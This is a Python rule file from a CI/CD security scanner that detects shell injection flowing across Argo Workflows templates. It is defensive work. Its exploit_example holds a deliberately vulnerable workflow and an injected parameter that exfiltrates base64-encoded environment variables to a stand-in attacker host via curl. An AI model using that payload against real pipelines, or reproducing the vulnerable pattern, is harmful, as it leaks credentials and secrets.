"""TAINT-007. Untrusted input flows across Argo templates via outputs.parameters.

The Argo Workflows analogue of ``TAINT-006`` (Tekton results).
Argo's cross-template channel is
``{{tasks.<task>.outputs.parameters.<output>}}`` substitution
inside DAG / Steps orchestrators. A producer template's script
interpolates ``{{inputs.parameters.X}}`` and writes the value to
an output parameter; a consumer task references the output via
the cross-task substitution; the consumer template's script
interpolates the value back into shell.

ARGO-005 catches the producer's inner interpolation. TAINT-007
catches the actual injection at the consumer template's script.

The detector lives in
``pipeline_check.core.checks.argo._taint_graph.analyze_workflow_doc``.
"""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from .._taint_graph import analyze_workflow_doc
from ..base import ArgoContext

RULE = Rule(
    id="TAINT-007",
    title=(
        "Untrusted input flows across templates via Argo "
        "``outputs.parameters``"
    ),
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78", "CWE-829"),
    recommendation=(
        "Sanitise the value at the producer template before it "
        "lands in an output parameter. The canonical safe "
        "pattern is to surface ``{{inputs.parameters.<X>}}`` "
        "into a quoted shell variable, run a sanitiser "
        "(``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and "
        "only then redirect the cleaned value to the output "
        "path. The consumer template should still reference "
        "``{{inputs.parameters.<name>}}`` quoted "
        "(``\"{{inputs.parameters.title}}\"``) and never inline "
        "into a command without re-quoting. Removing the "
        "cross-template forwarding is the strongest fix; if "
        "the value genuinely needs to flow downstream, validate "
        "the sanitiser is doing what you think before relying "
        "on it."
    ),
    docs_note=(
        "Detection walks every workflow document with "
        "``spec.templates``. Pass 1 looks for templates that "
        "declare ``outputs.parameters`` AND whose inline "
        "``script.source`` interpolates ``{{inputs.parameters."
        "<X>}}``, recording the template's outputs as tainted. "
        "Pass 2 walks each template's DAG / Steps orchestrator "
        "for tasks whose ``arguments.parameters[*].value`` is "
        "``{{tasks.<producer>.outputs.parameters.<X>}}`` "
        "matching a recorded leak. Pass 3 walks the consumer "
        "task's referenced template for the matching "
        "``{{inputs.parameters.<consumer-param>}}`` reference "
        "in its script body and emits one path per match.\n\n"
        "v1 limitations: ``workflowTemplateRef:`` cross-document "
        "references aren't resolved (would need the same "
        "machinery as the GHA ``--resolve-remote`` flow). "
        "``onExit:`` exit handlers aren't yet walked."
    ),
    known_fp=(
        "If the producer template runs a sanitiser between the "
        "tainted ``{{inputs.parameters.X}}`` interpolation and "
        "the output-path write, the consumer is no longer "
        "exploitable but TAINT-007 still fires. Suppress via "
        "ignore-file scoped to the consumer template name when "
        "this is the deliberate shape; the sanitiser is then "
        "load-bearing.",
    ),
    exploit_example=(
        "# Vulnerable: producer template hands a tainted parameter\n"
        "# through outputs.parameters; consumer interpolates it into\n"
        "# its own shell.\n"
        "apiVersion: argoproj.io/v1alpha1\n"
        "kind: Workflow\n"
        "metadata: { generateName: ci- }\n"
        "spec:\n"
        "  entrypoint: main\n"
        "  arguments: { parameters: [ { name: title } ] }\n"
        "  templates:\n"
        "    - name: main\n"
        "      dag:\n"
        "        tasks:\n"
        "          - name: produce\n"
        "            template: read-title\n"
        "            arguments:\n"
        "              parameters:\n"
        "                - name: title\n"
        "                  value: '{{workflow.parameters.title}}'\n"
        "          - name: consume\n"
        "            template: ship\n"
        "            dependencies: [produce]\n"
        "            arguments:\n"
        "              parameters:\n"
        "                - name: clean_title\n"
        "                  value: '{{tasks.produce.outputs.parameters.title}}'\n"
        "    - name: read-title\n"
        "      inputs: { parameters: [ { name: title } ] }\n"
        "      outputs:\n"
        "        parameters:\n"
        "          - name: title\n"
        "            valueFrom: { path: /tmp/title.txt }\n"
        "      script:\n"
        "        image: alpine:3.20\n"
        "        command: [sh]\n"
        "        # BUG: tainted input written to output path unchanged.\n"
        "        source: echo '{{inputs.parameters.title}}' > /tmp/title.txt\n"
        "    - name: ship\n"
        "      inputs: { parameters: [ { name: clean_title } ] }\n"
        "      script:\n"
        "        image: alpine:3.20\n"
        "        command: [sh]\n"
        "        # BUG: re-interpolation into shell.\n"
        "        source: |\n"
        "          curl https://api/announce --data-urlencode \\\n"
        "            \"title={{inputs.parameters.clean_title}}\"\n"
        "\n"
        "# Attack: caller submits the workflow with a parameter that\n"
        "# carries shell:\n"
        "#\n"
        "#   argo submit wf.yml \\\n"
        "#     -p title='ok\";curl attacker/x -d \"$(env|base64)\";echo \"'\n"
        "#\n"
        "# ``read-title`` writes the tainted bytes verbatim to\n"
        "# /tmp/title.txt; Argo hands them through ``outputs.\n"
        "# parameters.title`` into the consumer's ``clean_title``\n"
        "# input; the consumer's ``source:`` interpolates them back\n"
        "# into the shell. The container's ServiceAccount carries\n"
        "# whatever privilege you've granted the workflow.\n"
        "\n"
        "# Safe: sanitise in the producer before writing the output,\n"
        "# and keep the consumer's reference quoted as an extra belt.\n"
        "    - name: read-title\n"
        "      inputs: { parameters: [ { name: title } ] }\n"
        "      outputs:\n"
        "        parameters:\n"
        "          - name: title\n"
        "            valueFrom: { path: /tmp/title.txt }\n"
        "      script:\n"
        "        image: alpine:3.20\n"
        "        command: [sh]\n"
        "        env:\n"
        "          - name: RAW\n"
        "            value: '{{inputs.parameters.title}}'\n"
        "        source: printf '%s' \"$RAW\" | tr -dc 'a-zA-Z0-9 ' > /tmp/title.txt"
    ),
)


def check(ctx: ArgoContext) -> Finding:
    examined = 0
    all_paths = []
    for doc in ctx.docs:
        # Workflow / WorkflowTemplate / ClusterWorkflowTemplate /
        # CronWorkflow all carry templates; the engine handles each.
        if doc.kind not in (
            "Workflow", "WorkflowTemplate",
            "ClusterWorkflowTemplate", "CronWorkflow",
        ):
            continue
        examined += 1
        all_paths.extend(analyze_workflow_doc(doc))

    if examined == 0:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argo",
            description="No Argo workflow documents to check.",
            recommendation="No action required.", passed=True,
        )
    if not all_paths:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argo",
            description=(
                "No cross-template taint path detected via "
                "``outputs.parameters`` propagation."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    rendered = [p.render() for p in all_paths]
    desc = (
        f"{len(all_paths)} cross-template taint path(s) reach a "
        f"downstream sink via outputs.parameters: "
        f"{'; '.join(rendered[:3])}"
        f"{'...' if len(rendered) > 3 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource="argo", description=desc,
        recommendation=RULE.recommendation, passed=False,
    )
